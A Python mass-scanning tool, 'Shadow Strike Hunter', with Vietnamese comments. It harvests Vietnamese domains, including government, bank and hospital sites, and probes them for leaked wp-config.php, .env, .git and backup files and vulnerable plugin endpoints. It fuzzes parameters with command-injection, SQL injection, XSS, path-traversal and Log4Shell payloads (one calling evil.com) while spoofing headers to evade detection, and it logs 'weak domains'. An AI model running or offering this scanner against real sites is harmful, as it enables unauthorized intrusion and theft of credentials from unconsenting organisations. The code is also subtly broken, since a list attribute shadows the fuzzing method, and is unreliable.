import requests
import re
import concurrent.futures
import urllib3
import random
import os
import sys
import time
import json
from threading import Lock, Semaphore
import idna
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

R, G, Y, B, C, P, W = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m', '\033[95m', '\033[0m'
BOLD, UNDER = '\033[1m', '\033[4m'

class ShadowStrikeHunter:
    def __init__(self):
        self.output = 'SHADOW_STRIKE_2026.txt'
        self.weak_domains_file = 'WEAK_DOMAINS.txt'
        self.vuln_report_json = 'VULN_REPORT_2026.json'
        self.targets = set()
        self.processed = 0
        self.found_count = 0
        self.lock = Lock()
        self.semaphore = Semaphore(15)
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

        # PROXY & UA - giữ nguyên
        self.proxies = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
            'Mozilla/5.0 (Android 14; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0',
        ]

        # ENDPOINTS NÂNG CẤP - giữ nguyên
        self.critical_endpoints = [
            ('/wp-config.php', 'DB_CONFIG_LEAK'),
            ('/.env', 'ENV_LEAK'),
            ('/wp-config.bak', 'CONFIG_BAK'),
            ('/wp-config.php.bak', 'CONFIG_PHP_BAK'),
            ('/wp-config.old', 'OLD_CONFIG'),
            ('/wp-content/debug.log', 'DEBUG_LOG'),
            ('/.git/config', 'GIT_CONFIG'),
            ('/.git/HEAD', 'GIT_HEAD'),
            ('/wp-json/wp/v2/users', 'USER_ENUM'),
            ('/xmlrpc.php', 'XMLRPC_BRUTE'),
            ('/wp-content/ai1wm-backups/', 'AI1WM_BACKUP'),
            ('/wp-content/updraft/', 'UPDRAFT_BACKUP'),
            ('/wp-content/uploads/duplicator-backups/', 'DUPLICATOR_BACKUP'),
            ('/wp-content/uploads/wpvivid-backup/', 'WPVIVID_BACKUP'),
            ('/wp-content/backups-dup-lite/', 'DUPLICATOR_LITE'),
            ('/wp-content/uploads/backupbuddy-backups/', 'BACKUPBUDDY'),
            ('/backup/', 'ROOT_BACKUP_DIR'),
            ('/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', 'FM_RCE'),
            ('/wp-content/plugins/backup-backup/includes/backup-heart.php', 'BACKUP_RCE'),
            ('/wp-content/plugins/multi-uploader/upload.php', 'MULTIUPLOADER_RCE'),
            ('/wp-admin/admin-ajax.php?action=aiengine_upload', 'AI_ENGINE_RCE'),
            ('/wp-admin/admin-ajax.php?action=revslider_show_image', 'REVSIDER_RCE'),
            ('/wp-content/plugins/contact-form-7/includes/submissions.php', 'CF7_SQLI_ENTRY'),
            ('/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.js', 'WOO_ENTRY'),
            ('/wp-admin/admin-ajax.php?action=elementor_ajax', 'ELEMENTOR_RCE_ENTRY'),
        ]

        # Plugin phổ biến - giữ nguyên
        self.vuln_plugins = {
            'elementor': {'old': ['<3.25.0'], 'desc': 'Unauth RCE/Upload/File Inclusion CVE-2023-48777/2022-1329'},
            'contact-form-7': {'old': ['<5.9.0'], 'desc': 'Stored XSS/SQLi/Open Redirect CVE-2020-35489/2025-3247'},
            'woocommerce': {'old': ['<9.5.0'], 'desc': 'Multiple SQLi/XSS/Priv Esc CVE-2025-xxxx'},
            'wp-file-manager': {'old': ['<7.2.0'], 'desc': 'Unauth RCE/File Upload CVE-2020-25213'},
            'wp-ulike': {'old': ['<4.6.9'], 'desc': 'Stored XSS/SQLi/Race Condition CVE-2023-3044'},
            'revslider': {'old': ['<6.6.0'], 'desc': 'SQLi/File Inclusion/RCE CVE-2015-1579'},
            'ninja-forms': {'old': ['<3.6.0'], 'desc': 'Stored XSS/CSV Injection CVE-2023-37979'},
            'td-composer': {'old': ['<2.0'], 'desc': 'Stored XSS/CSRF CVE-2023-3169'},
            'wpforms-lite': {'old': ['<1.8.0'], 'desc': 'Unauth Stored XSS CVE-2023-37979'},
            'ai-engine': {'old': ['<1.0'], 'desc': 'Unauth Upload/RCE CVE-2025-7847'},
            'updraftplus': {'old': ['<1.23.0'], 'desc': 'Backup Leak/Priv Esc CVE-2023-3630'},
        }

        # THÊM DANH SÁCH PARAMETERS ĐỂ FUZZ
        self.fuzz_parameters = [
            'debug', 'test', 'admin', 'file', 'cmd', 'action', 'download',
            'path', 'dir', 'show', 'display', 'view', 'load', 'config',
            'setting', 'option', 'backup', 'wp-config', 'plugins', 'themes',
            'upload', 'delete', 'edit', 'id', 'page', 'post', 'attachment',
            'callback', 'json', 'xml', 'feed', 'rss', 'atom', 'redirect',
            'url', 'return', 'ref', 'referer', 'lang', 'language', 'locale',
            'theme', 'template', 'style', 'script', 'js', 'css', 'img',
            'image', 'picture', 'photo', 'video', 'audio', 'media', 'doc',
            'document', 'pdf', 'txt', 'log', 'bak', 'old', 'temp', 'tmp',
            'cache', 'session', 'cookie', 'auth', 'token', 'key', 'secret',
            'password', 'pass', 'pwd', 'user', 'username', 'email', 'mail',
            'login', 'logout', 'register', 'signup', 'signin', 'signout',
            'search', 'find', 'query', 'q', 's', 'term', 'keyword', 'tag',
            'category', 'cat', 'taxonomy', 'archive', 'date', 'year',
            'month', 'day', 'time', 'hour', 'minute', 'second', 'week',
            'author', 'profile', 'account', 'dashboard', 'panel', 'console',
            'admin-ajax', 'admin-post', 'wp-admin', 'wp-login', 'wp-signup',
            'rest_route', 'rest_api', 'api', 'jsonp', 'callback', 'jQuery',
            'ajax', 'xmlrpc', 'pingback', 'trackback', 'comment', 'reply',
            'submit', 'save', 'update', 'delete', 'trash', 'spam', 'approve',
            'unapprove', 'publish', 'draft', 'pending', 'private', 'public',
            'attachment_id', 'post_id', 'page_id', 'term_id', 'user_id',
            'comment_id', 'media_id', 'menu_id', 'widget_id', 'option_id',
            'meta_id', 'tax_id', 'cat_id', 'tag_id', 'author_id', 'year_id',
            'month_id', 'day_id', 'hour_id', 'minute_id', 'second_id',
            'nonce', '_wpnonce', '_ajax_nonce', '_wp_http_referer',
            'action', 'action2', 'bulk_action', 'doaction', 'action',
            'mode', 'view', 'filter', 'orderby', 'order', 's', 'paged',
            'posts_per_page', 'post_type', 'post_status', 'post_author',
            'cat', 'tag', 'taxonomy', 'term', 'year', 'monthnum', 'day',
            'hour', 'minute', 'second', 'w', 'm', 'p', 'page_id', 'pagename',
            'name', 'post_name', 'attachment', 'attachment_id', 'static',
            'p', 'page_id', 'page', 'pagename', 'name', 'post_name',
            'year', 'monthnum', 'day', 'hour', 'minute', 'second', 'm',
            'w', 'cat', 'tag', 'taxonomy', 'term', 'author', 'author_name',
            'feed', 'tb', 'pb', 'comment', 'replytocom', 'cpage', 's',
            'exact', 'sentence', 'post_type', 'preview', 'p', 'page_id',
            'attachment_id', 'static', 'pagename', 'name', 'post_name',
            'subpost', 'subpost_id', 'attachment', 'attachment_id',
            'year', 'monthnum', 'day', 'hour', 'minute', 'second', 'm',
            'w', 'cat', 'tag', 'taxonomy', 'term', 'author', 'author_name',
            'feed', 'tb', 'pb', 'comment', 'replytocom', 'cpage', 's',
            'exact', 'sentence', 'post_type', 'preview'
        ]

        # THÊM GIÁ TRỊ PAYLOAD CHO FUZZING
        self.fuzz_values = [
            'true', 'false', '1', '0', 'yes', 'no', 'on', 'off',
            'null', 'NULL', 'None', 'none', 'undefined', 'Undefined',
            'test', 'test123', 'admin', 'administrator', 'root',
            'wp-config.php', '../../../../etc/passwd',
            'file:///etc/passwd', 'http://evil.com',
            '<?php phpinfo(); ?>', '<script>alert(1)</script>',
            '${jndi:ldap://evil.com/a}', ';cat /etc/passwd',
            '|cat /etc/passwd', '`cat /etc/passwd`', '$(cat /etc/passwd)',
            'sleep(5)', 'waitfor delay \'00:00:05\'',
            '1\' OR \'1\'=\'1', '1\" OR \"1\"=\"1',
            '1 OR 1=1', '1\' AND \'1\'=\'2', '1\" AND \"1\"=\"2',
            '1 AND 1=2', '1\' UNION SELECT NULL--',
            '1\" UNION SELECT NULL--', '1 UNION SELECT NULL--',
            '../../../../windows/win.ini', 'C:\\windows\\win.ini',
            '..\\..\\..\\..\\windows\\win.ini', '/etc/hosts',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'http://localhost', '127.0.0.1', '0.0.0.0', '255.255.255.255',
            'localhost', 'LOCALHOST', 'Localhost', '127.1',
            '2130706433', '0177.0.0.1', '0x7f.0.0.1',
            'admin@example.com', 'test@example.com', 'root@localhost',
            'administrator@localhost', 'superadmin@example.com',
            'backup', 'backup.zip', 'backup.tar', 'backup.tar.gz',
            'backup.sql', 'database.sql', 'dump.sql', 'export.sql',
            'wp-config.php.bak', '.env.bak', 'config.bak',
            'settings.bak', 'configuration.bak', 'backup.bak',
            'old', 'old.php', 'old.txt', 'old.bak', 'old.backup',
            'temp', 'temp.php', 'temp.txt', 'temp.bak', 'temp.backup',
            'tmp', 'tmp.php', 'tmp.txt', 'tmp.bak', 'tmp.backup',
            'cache', 'cache.php', 'cache.txt', 'cache.bak', 'cache.backup',
            'session', 'session.php', 'session.txt', 'session.bak', 'session.backup',
            'cookie', 'cookie.php', 'cookie.txt', 'cookie.bak', 'cookie.backup',
            'auth', 'auth.php', 'auth.txt', 'auth.bak', 'auth.backup',
            'token', 'token.php', 'token.txt', 'token.bak', 'token.backup',
            'key', 'key.php', 'key.txt', 'key.bak', 'key.backup',
            'secret', 'secret.php', 'secret.txt', 'secret.bak', 'secret.backup',
            'password', 'password.php', 'password.txt', 'password.bak', 'password.backup',
            'pass', 'pass.php', 'pass.txt', 'pass.bak', 'pass.backup',
            'pwd', 'pwd.php', 'pwd.txt', 'pwd.bak', 'pwd.backup',
            'user', 'user.php', 'user.txt', 'user.bak', 'user.backup',
            'username', 'username.php', 'username.txt', 'username.bak', 'username.backup',
            'email', 'email.php', 'email.txt', 'email.bak', 'email.backup',
            'mail', 'mail.php', 'mail.txt', 'mail.bak', 'mail.backup',
            'login', 'login.php', 'login.txt', 'login.bak', 'login.backup',
            'logout', 'logout.php', 'logout.txt', 'logout.bak', 'logout.backup',
            'register', 'register.php', 'register.txt', 'register.bak', 'register.backup',
            'signup', 'signup.php', 'signup.txt', 'signup.bak', 'signup.backup',
            'signin', 'signin.php', 'signin.txt', 'signin.bak', 'signin.backup',
            'signout', 'signout.php', 'signout.txt', 'signout.bak', 'signout.backup'
        ]

    def get_proxy(self):
        if not self.proxies: return None
        p = random.choice(self.proxies)
        return {"http": p, "https": p}

    # THÊM NHIỀU NGUỒN DOMAIN MỚI
    def fetch_infinity_sources(self):
        # Mở rộng danh sách keywords
        vn_keywords = [
            '.gov.vn', '.edu.vn', '.com.vn', '.net.vn', '.org.vn', 
            '.vn', '.ac.vn', '.biz.vn', '.info.vn', '.name.vn',
            'mienbac', 'mientrung', 'miennam', 'hanoi', 'hochiminh',
            'danang', 'haiphong', 'cantho', 'nhatrang', 'dalat',
            'vietnam', 'vietnamese', 'tiengviet', 'tiếngviệt'
        ]
        
        content_keywords = [
            'wordpress', 'wp-content', 'wp-includes', 'wp-admin',
            'portal', 'thuvien', 'tintuc', 'blog', 'shop', 'hoidap',
            'dien dan', 'forum', 'diễn đàn', 'raovat', 'rao vặt',
            'muaban', 'mua bán', 'batdongsan', 'bất động sản',
            'tuyendung', 'tuyển dụng', 'vieclam', 'việc làm',
            'dulich', 'du lịch', 'amthuc', 'ẩm thực',
            'giaitri', 'giải trí', 'thethao', 'thể thao',
            'suckhoe', 'sức khỏe', 'yte', 'y tế',
            'giaoduc', 'giáo dục', 'daotao', 'đào tạo',
            'cntt', 'công nghệ thông tin', 'it', 'software',
            'web', 'website', 'trang web', 'site', 'trang tin'
        ]
        
        industry_keywords = [
            'nganhang', 'ngân hàng', 'bank', 'taichinh', 'tài chính',
            'baohiem', 'bảo hiểm', 'insurance', 'chungkhoan', 'chứng khoán',
            'xaydung', 'xây dựng', 'construction', 'dientu', 'điện tử',
            'oto', 'ô tô', 'car', 'xe', 'vehicle',
            'nongsan', 'nông sản', 'agriculture', 'thuysan', 'thủy sản',
            'maymac', 'may mặc', 'fashion', 'textile',
            'dienmay', 'điện máy', 'electronics', 'homeappliance',
            'nhahang', 'nhà hàng', 'restaurant', 'khachsan', 'khách sạn',
            'benhvien', 'bệnh viện', 'hospital', 'phongkham', 'phòng khám'
        ]
        
        all_keywords = vn_keywords + content_keywords + industry_keywords
        
        print(f"{B}[*] Đang thu thập mục tiêu từ đa nguồn...{W}")

        def get_crt(kw):
            for attempt in range(3):
                try:
                    r = requests.get(f"https://crt.sh/?q={kw}&output=json", timeout=30 + attempt*15)
                    if r.status_code == 200:
                        filtered = [i['name_value'].lower().replace('*.', '')
                                    for i in r.json()
                                    if len(i['name_value'].split('.')) <= 4 and len(i['name_value']) < 80]
                        # Lọc subdomain rác
                        bad_keywords = ['test', 'staging', 'dev', 'beta', 'cache', 'cdn', 'mail', 'api', 'forum']
                        return [d for d in filtered if not any(k in d for k in bad_keywords)]
                    time.sleep(3 * (attempt + 1))
                except Exception as e:
                    print(f"{Y}[!] Lỗi {kw} (lần {attempt+1}): {str(e)}{W}")
            return []

        def get_wayback(kw):
            try:
                r = requests.get(f"http://web.archive.org/cdx/search/cdx?url=*.{kw}/*&output=json&fl=original&collapse=urlkey", timeout=30)
                if r.status_code == 200:
                    urls = r.json()
                    domains = set()
                    for url_list in urls[1:]:  # Bỏ header
                        if url_list:
                            url = url_list[0]
                            domain = url.split('/')[2]
                            if '.' + kw in domain and len(domain.split('.')) <= 4:
                                domains.add(domain.lower())
                    return list(domains)
            except:
                pass
            return []

        def get_rapiddns(kw):
            try:
                # Sử dụng API public của RapidDNS
                r = requests.get(f"https://rapiddns.io/subdomain?domain={kw}&full=1&down=1#result", timeout=30)
                if r.status_code == 200:
                    # Parse HTML để lấy domains
                    domains = re.findall(r'<td>([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})</td>', r.text)
                    filtered = [d.lower() for d in domains if kw in d and len(d.split('.')) <= 4]
                    return list(set(filtered))
            except:
                pass
            return []

        def get_virustotal(kw):
            try:
                # Cố gắng lấy từ VirusTotal (có thể bị rate limit)
                r = requests.get(f"https://www.virustotal.com/ui/domains/{kw}/subdomains", 
                                headers={'User-Agent': 'Mozilla/5.0'}, timeout=30)
                if r.status_code == 200:
                    data = r.json()
                    domains = [item['id'] for item in data.get('data', []) if '.' + kw in item['id']]
                    return domains
            except:
                pass
            return []

        # THÊM NGUỒN TỪ DANH SÁCH DOMAIN CÔNG KHAI
        def get_public_domains():
            public_sources = [
                "https://raw.githubusercontent.com/publicsuffix/list/master/public_suffix_list.dat",
                "https://data.iana.org/TLD/tlds-alpha-by-domain.txt",
                "https://www.domcop.com/files/top/top10milliondomains.csv.zip?2026",
            ]
            domains = []
            for url in public_sources[:1]:  # Chỉ lấy từ nguồn đầu tiên để tránh quá tải
                try:
                    r = requests.get(url, timeout=30)
                    if r.status_code == 200:
                        lines = r.text.split('\n')
                        domains.extend([line.strip().lower() for line in lines 
                                      if line.strip() and not line.startswith('#') and '.' in line])
                except:
                    continue
            return domains

        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
            # Thu thập từ tất cả nguồn
            futures = []
            
            # 1. Từ crt.sh
            for kw in all_keywords[:20]:  # Giới hạn 20 keyword đầu để tránh quá tải
                futures.append(executor.submit(get_crt, kw))
            
            # 2. Từ Wayback Machine
            for kw in all_keywords[20:40]:
                futures.append(executor.submit(get_wayback, kw))
            
            # 3. Từ RapidDNS
            for kw in all_keywords[40:50]:
                futures.append(executor.submit(get_rapiddns, kw))
            
            # 4. Thêm domain từ public sources
            futures.append(executor.submit(get_public_domains))
            
            # Xử lý kết quả
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.targets.update(result)
                        print(f"{G}[+] Thêm {len(result)} domain từ source{W}")
                except Exception as e:
                    print(f"{Y}[!] Lỗi khi xử lý source: {str(e)}{W}")

        # THÊM DOMAIN TỪ FILE NGOÀI NẾU CÓ
        domain_files = ['domains.txt', 'targets.txt', 'urls.txt']
        for file in domain_files:
            if os.path.exists(file):
                try:
                    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                        for line in lines:
                            domain = line.strip().lower()
                            if domain and '.' in domain:
                                # Chuẩn hóa domain
                                domain = domain.replace('http://', '').replace('https://', '').split('/')[0]
                                self.targets.add(domain)
                    print(f"{G}[+] Đã load {len(lines)} domain từ {file}{W}")
                except Exception as e:
                    print(f"{Y}[!] Lỗi đọc file {file}: {str(e)}{W}")

        # Lọc và làm sạch domains
        cleaned_targets = set()
        for domain in self.targets:
            if len(domain) < 100 and domain.count('.') >= 1:
                # Loại bỏ các domain rác
                if any(x in domain for x in ['test.', 'dev.', 'staging.', 'localhost', '127.0.0.1']):
                    continue
                cleaned_targets.add(domain)
        
        self.targets = cleaned_targets
        print(f"{G}[✅] Tổng kho mục tiêu: {len(self.targets):,} domain.{W}")

    def get_plugin_version(self, base_url, slug, headers, proxy):
        paths = [
            f"/wp-content/plugins/{slug}/readme.txt",
            f"/wp-content/plugins/{slug}/changelog.txt",
            f"/wp-content/plugins/{slug}/style.css"
        ]
        for path in paths:
            try:
                url = base_url.rstrip('/') + path
                r = requests.get(url, headers=headers, proxies=proxy, timeout=6, verify=False)
                if r.status_code == 200:
                    match = re.search(r'(?:Stable tag|Version):\s*([\d\.]+)', r.text, re.IGNORECASE)
                    return match.group(1) if match else "Unknown"
            except:
                continue
        return "N/A"

    def decode_domain(self, domain):
        try:
            return idna.decode(domain)
        except:
            return domain

    # THÊM TÍNH NĂNG FUZZ PARAMETER
    def fuzz_parameters(self, base_url, headers, proxy):
        """Fuzz các parameter trên URL"""
        findings = []
        
        # Tạo danh sách URL để fuzz
        fuzz_urls = [
            base_url,
            base_url.rstrip('/') + '/wp-admin/',
            base_url.rstrip('/') + '/wp-login.php',
            base_url.rstrip('/') + '/index.php',
            base_url.rstrip('/') + '/admin.php',
            base_url.rstrip('/') + '/administrator/index.php'
        ]
        
        for url in fuzz_urls:
            try:
                # Lấy response gốc để so sánh
                orig_resp = requests.get(url, headers=headers, proxies=proxy, timeout=8, verify=False, allow_redirects=False)
                orig_length = len(orig_resp.content)
                orig_hash = hashlib.md5(orig_resp.content).hexdigest()
                
                # Fuzz với một số parameter quan trọng
                test_params = random.sample(self.fuzz_parameters, min(15, len(self.fuzz_parameters)))  # Chọn ngẫu nhiên 15 param
                test_values = random.sample(self.fuzz_values, min(10, len(self.fuzz_values)))  # Chọn ngẫu nhiên 10 value
                
                for param in test_params:
                    for value in test_values[:3]:  # Chỉ test 3 giá trị đầu cho mỗi param
                        try:
                            time.sleep(random.uniform(0.2, 0.5))
                            
                            # Tạo URL với parameter
                            if '?' in url:
                                fuzz_url = f"{url}&{param}={value}"
                            else:
                                fuzz_url = f"{url}?{param}={value}"
                            
                            # Gửi request
                            resp = requests.get(fuzz_url, headers=headers, proxies=proxy, 
                                              timeout=8, verify=False, allow_redirects=False)
                            
                            new_length = len(resp.content)
                            new_hash = hashlib.md5(resp.content).hexdigest()
                            
                            # Kiểm tra sự khác biệt
                            if new_hash != orig_hash:
                                diff_percent = abs(new_length - orig_length) / max(orig_length, 1) * 100
                                
                                if diff_percent > 30:  # Nếu khác biệt > 30%
                                    # Kiểm tra các dấu hiệu lỗi
                                    error_patterns = [
                                        r'error', r'warning', r'notice', r'undefined',
                                        r'mysql', r'database', r'syntax',
                                        r'file not found', r'cannot', r'failed',
                                        r'permission denied', r'access denied',
                                        r'sqli', r'sql injection', r'xss',
                                        r'remote code execution', r'command execution'
                                    ]
                                    
                                    content_lower = resp.text.lower()
                                    errors_found = []
                                    for pattern in error_patterns:
                                        if re.search(pattern, content_lower):
                                            errors_found.append(pattern)
                                    
                                    if errors_found or diff_percent > 50:
                                        findings.append(f"{R}[PARAM_FUZZ] {param}={value} tại {url} - Diff: {diff_percent:.1f}%{W}")
                                        if errors_found:
                                            findings.append(f"   |-- Errors: {', '.join(errors_found[:3])}")
                                        break  # Dừng fuzz param này nếu tìm thấy lỗi
                        except:
                            continue
                    
                    # Nếu đã tìm thấy lỗi với param này, chuyển sang param tiếp theo
                    if any('[PARAM_FUZZ]' in f for f in findings[-3:]):  # Kiểm tra 3 findings gần nhất
                        break
            
            except:
                continue
        
        return findings

    def audit(self, domain):
        decoded_domain = self.decode_domain(domain)
        findings = []
        proxy = self.get_proxy()
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8']),
            'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        }

        base_url = None
        is_wp = False
        
        for proto in ['https', 'http']:
            url = f"{proto}://{domain}"
            try:
                time.sleep(random.uniform(1.5, 3.5))
                r_main = requests.get(url, headers=headers, proxies=proxy, timeout=12, verify=False)
                text_lower = r_main.text.lower()
                is_wp = any(x in text_lower for x in ['wp-content', 'wp-includes', 'wp-json', 'wordpress'])
                status_tag = f"{P}[WP]{W}" if is_wp else f"{C}[NON-WP]{W}"

                with self.lock:
                    sys.stdout.write(f"\r{Y}[*] Testing: {status_tag} {decoded_domain[:30]}{W} " + " " * 20)
                    sys.stdout.flush()

                if is_wp:
                    base_url = url
                    # Check PHP version
                    php_ver = r_main.headers.get('X-Powered-By', '')
                    if 'PHP/' in php_ver:
                        php_version = re.search(r'PHP/([\d\.]+)', php_ver).group(1) if re.search(r'PHP/([\d\.]+)', php_ver) else ''
                        if php_version and float(php_version[:3]) < 8.0:
                            findings.append(f"{R}[HIGH RISK] Outdated PHP v{php_version} - Multiple Vulns{W}")
                    # Check directory listing
                    uploads_url = base_url.rstrip('/') + '/wp-content/uploads/'
                    r_uploads = requests.get(uploads_url, headers=headers, proxies=proxy, timeout=7)
                    if r_uploads.status_code == 200 and ('Index of' in r_uploads.text or 'parent directory' in r_uploads.text):
                        findings.append(f"{Y}[DIR LIST] Exposed Uploads: {uploads_url}{W}")
                    break
            except:
                continue

        if not base_url:
            with self.lock:
                self.processed += 1
            return

        # Quét endpoint
        for path, label in self.critical_endpoints:
            with self.semaphore:
                try:
                    time.sleep(random.uniform(0.4, 1.2))
                    full_url = base_url.rstrip('/') + path
                    r = requests.get(full_url, headers=headers, proxies=proxy, timeout=7, verify=False, allow_redirects=False)
                    if r.status_code == 200 and len(r.content) > 50:
                        if any(ind in r.text for ind in ['DB_PASSWORD', '<?php', 'Index of', 'WPRESS', 'Stable tag']):
                            findings.append(f"{R}[CRITICAL] {label}: {full_url}{W}")
                except:
                    continue

        # Check plugin version
        plugin_slugs = set(re.findall(r'/wp-content/plugins/([^/\'"]+)/', r_main.text.lower()))
        if plugin_slugs:
            print(f"\n{Y}[PLUGIN] Detected on {decoded_domain}: {', '.join(list(plugin_slugs)[:6])}{W}")
            for slug in list(plugin_slugs)[:10]:
                ver = self.get_plugin_version(base_url, slug, headers, proxy)
                if ver != "N/A" and ver != "Unknown":
                    status = f"{P}[PLUGIN] {slug} v{ver}{W}"
                    if slug in self.vuln_plugins:
                        for old in self.vuln_plugins[slug]['old']:
                            if ver.startswith(tuple(old.split('.'))) or ver < old.lstrip('<'):
                                status = f"{R}[HIGH RISK] {slug} v{ver} - {self.vuln_plugins[slug]['desc']}{W}"
                                findings.append(status)
                    print(f" → {status}")

        # THÊM FUZZ PARAMETER NẾU LÀ WORDPRESS
        if is_wp:
            print(f"{C}[*] Đang fuzz parameter cho {decoded_domain}{W}")
            fuzz_findings = self.fuzz_parameters(base_url, headers, proxy)
            findings.extend(fuzz_findings)

        # Báo cáo
        with self.lock:
            self.processed += 1
            if findings:
                self.found_count += 1
                print(f"\n{G}{BOLD}[🎯] SUCCESS #{self.found_count}: {decoded_domain}{W}")
                for f in findings:
                    print(f" |-- {f}")
                with open(self.output, 'a', encoding='utf-8') as f:
                    clean = [re.sub(r'\033\[[0-9;]*m', '', i) for i in findings]
                    f.write(f"TARGET: {decoded_domain} (original: {domain})\n" + "\n".join(clean) + "\n\n")
                with open(self.weak_domains_file, 'a', encoding='utf-8') as wf:
                    wf.write(f"{decoded_domain}\n")
                # Lưu JSON report
                with open(self.vuln_report_json, 'a', encoding='utf-8') as jf:
                    jf.write(json.dumps({"domain": decoded_domain, "findings": clean}, ensure_ascii=False) + "\n")
                sys.stdout.write("\a")

            perc = (self.processed / len(self.targets)) * 100 if self.targets else 0
            sys.stdout.write(f"\r{Y}[*] Progress: {self.processed}/{len(self.targets)} ({perc:.2f}%) | Ghosting: {decoded_domain[:25]}...{W}")
            sys.stdout.flush()

    def start(self, threads=50):
        self.fetch_infinity_sources()
        if not self.targets:
            print(f"{R}[!] Không tìm thấy domain nào!{W}")
            return

        print(f"\n{B}{BOLD}[SHADOW STRIKE ACTIVATED]{W}")
        print(f"{B}[*] Threads: {threads} | Targets: {len(self.targets):,}{W}")
        print(f"{B}[*] Parameter Fuzzing: ENABLED (15 params × 3 values per domain){W}\n")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self.audit, list(self.targets))
        
        # Summary
        print(f"\n{G}{BOLD}[✅] SCAN HOÀN TẤT!{W}")
        print(f"{G}[*] Đã quét: {self.processed} domain{W}")
        print(f"{G}[*] Tìm thấy lỗ hổng: {self.found_count} domain{W}")
        print(f"{G}[*] Kết quả lưu tại: {self.output}, {self.weak_domains_file}, {self.vuln_report_json}{W}")

if __name__ == "__main__":
    try:
        print(f"""{B}
    ╔══════════════════════════════════════════════════════╗
    ║      SHADOW STRIKE HUNTER 2026 - ENHANCED EDITION    ║
    ║      Domain Expansion + Parameter Fuzzing Enabled    ║
    ╚══════════════════════════════════════════════════════╝{W}""")
        
        # Tạo thư mục output nếu chưa có
        os.makedirs('shadow_strike_results', exist_ok=True)
        hunter = ShadowStrikeHunter()
        hunter.output = 'shadow_strike_results/SHADOW_STRIKE_2026.txt'
        hunter.weak_domains_file = 'shadow_strike_results/WEAK_DOMAINS.txt'
        hunter.vuln_report_json = 'shadow_strike_results/VULN_REPORT_2026.json'
        
        hunter.start(threads=50)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Dừng bởi người dùng.{W}")
    except Exception as e:
        print(f"{R}[!] Lỗi không mong muốn: {str(e)}{W}")